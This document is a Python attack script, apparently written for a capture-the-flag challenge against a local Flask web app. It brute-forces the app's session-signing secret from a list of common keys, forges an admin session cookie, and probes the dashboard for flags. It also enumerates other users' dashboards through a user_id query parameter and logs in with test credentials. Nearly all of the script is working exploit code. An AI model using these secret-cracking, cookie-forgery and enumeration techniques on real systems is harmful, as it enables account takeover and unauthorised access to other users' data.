import base64
import requests
import json
import hashlib
import hmac
import time
from itsdangerous import URLSafeTimedSerializer

# Target information
base_url = "http://127.0.0.1:32948"
original_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.ac1HnA.FebyScjcMvCp0EyankY0kHuCbcA"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Decode original cookie to understand the format
print("[+] Analyzing original cookie...")
parts = original_cookie.split('.')
print(f"Parts: {parts}")

payload = base64.urlsafe_b64decode(parts[0] + '==')
print(f"Decoded payload: {payload}")

ts_bytes = base64.urlsafe_b64decode(parts[1] + '==')
ts = int.from_bytes(ts_bytes, 'little')
print(f"Timestamp: {ts}")

# Try to brute-force the secret key with common variations
message = parts[0] + '.' + parts[1]
original_sig = parts[2]

print(f"\n[+] Message to sign: {message}")
print(f"Original signature: {original_sig}")

# Extended secret list
secrets_to_try = [
    "your_secret_key",
    "your-secret-key",
    "your_secret_key_here",
    "secret_key",
    "secret",
    "supersecret",
    "flask",
    "FLASK",
    "Flask",
    "test",
    "testing",
    "development",
    "dev",
    "password",
    "admin",
    "123456",
    "key",
    "secret123",
    "key123",
    "app_secret",
    "appsecret",
    "changeme",
    "change_me",
    "my_secret",
    "mysecret",
    "MY_SECRET",
    "not_secret",
    "private_key",
    "flask_secret",
    "app_key",
    "APP_KEY",
    "SECRET_KEY",
    "secretkey",
]

print("\n[+] Brute forcing secret keys...")
found_secret = None

for secret in secrets_to_try:
    # Standard itsdangerous signing (no salt)
    sig = hmac.new(secret.encode(), message.encode(), hashlib.sha1).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode('ascii')
    
    if sig_b64 == original_sig:
        print(f"  [!] FOUND SECRET: '{secret}' (no salt)")
        found_secret = secret
        break
    
    # Try with 'cookie-session' salt (Flask default)
    salt = 'cookie-session'
    key = hashlib.sha1((salt + secret).encode()).digest()
    sig_salted = hmac.new(key, message.encode(), hashlib.sha1).digest()
    sig_salted_b64 = base64.urlsafe_b64encode(sig_salted).rstrip(b'=').decode('ascii')
    
    if sig_salted_b64 == original_sig:
        print(f"  [!] FOUND SECRET: '{secret}' with salt 'cookie-session'")
        found_secret = (secret, salt)
        break

if not found_secret:
    print("  [-] Secret not found in common list")
    
    # Try with SHA-256 instead
    print("\n[+] Trying SHA-256 hashing...")
    for secret in secrets_to_try[:10]:  # Just test a few
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode('ascii')
        if sig_b64 == original_sig:
            print(f"  [!] FOUND with SHA-256: '{secret}'")
            found_secret = secret
            break

# If we found the secret, create forged admin cookie
if found_secret:
    print(f"\n[+] Creating forged admin cookie...")
    if isinstance(found_secret, tuple):
        serializer = URLSafeTimedSerializer(found_secret[0], salt=found_secret[1])
    else:
        serializer = URLSafeTimedSerializer(found_secret)
    
    forged_cookie = serializer.dumps({"user_id": "1"})
    print(f"Forged cookie (user_id=1): {forged_cookie}")
    
    # Test the forged cookie
    resp = requests.get(base_url + "/dashboard", headers=headers, cookies={"session": forged_cookie}, allow_redirects=False)
    print(f"Dashboard access: {resp.status_code}")
    
    if resp.status_code == 200:
        print("\n[!] ADMIN ACCESS GRANTED!")
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"[!] FLAG: {flags}")
        print(f"\nFull response:\n{resp.text}")
else:
    # Try to access with the original valid cookie and enumerate users
    print("\n[+] Using original valid cookie to explore...")
    resp_dash = requests.get(base_url + "/dashboard", headers=headers, cookies={"session": original_cookie}, allow_redirects=False)
    print(f"Dashboard: {resp_dash.status_code}")
    
    if resp_dash.status_code == 200:
        # Check if the dashboard user is different
        import re
        user_match = re.search(r'Welcome, ([^<]+)', resp_dash.text)
        if user_match:
            print(f"Current user: {user_match.group(1)}")
        
        # Search the full dashboard
        print("\n[+] Full dashboard:")
        print(resp_dash.text)
        
        # Try to enumerate other users via query parameters
        print("\n[+] Enumerating user_ids via query parameter...")
        for uid in [1, 2, 3, 4, 5, 100, 1000]:
            url = f"{base_url}/dashboard?user_id={uid}"
            r = requests.get(url, headers=headers, cookies={"session": original_cookie}, allow_redirects=False)
            if r.status_code == 200:
                user_m = re.search(r'Welcome, ([^<]+)', r.text)
                if user_m and user_m.group(1) != "John Doe":
                    print(f"  user_id={uid}: User '{user_m.group(1)}'")
                    flags = re.findall(r'FLAG\{[^}]+\}', r.text)
                    if flags:
                        print(f"    [!] FLAG: {flags}")

# One final check - use the fresh session from login
print("\n[+] Getting fresh session via login...")
resp1 = requests.post(base_url + "/", data={"username": "test"}, headers=headers, allow_redirects=False)
pw_url = resp1.headers.get('location', '')
resp2 = requests.post(base_url + pw_url, data={"username": "test", "user_id": "10032", "password": "test"},
                      headers=headers, allow_redirects=False)

# Get cookies
if resp2.cookies.get('session'):
    new_cookie = resp2.cookies.get('session')
    print(f"Fresh cookie: {new_cookie}")
    
    # Decode to see what user_id it has
    new_parts = new_cookie.split('.')
    new_payload = base64.urlsafe_b64decode(new_parts[0] + '==')
    print(f"Fresh cookie payload: {new_payload}")
    
    # Test access
    resp3 = requests.get(base_url + "/dashboard", headers=headers, cookies={"session": new_cookie}, allow_redirects=False)
    print(f"Fresh cookie dashboard: {resp3.status_code}")
    if resp3.status_code == 200:
        flags = re.findall(r'FLAG\{[^}]+\}', resp3.text)
        if flags:
            print(f"[!] FLAG with fresh cookie: {flags}")
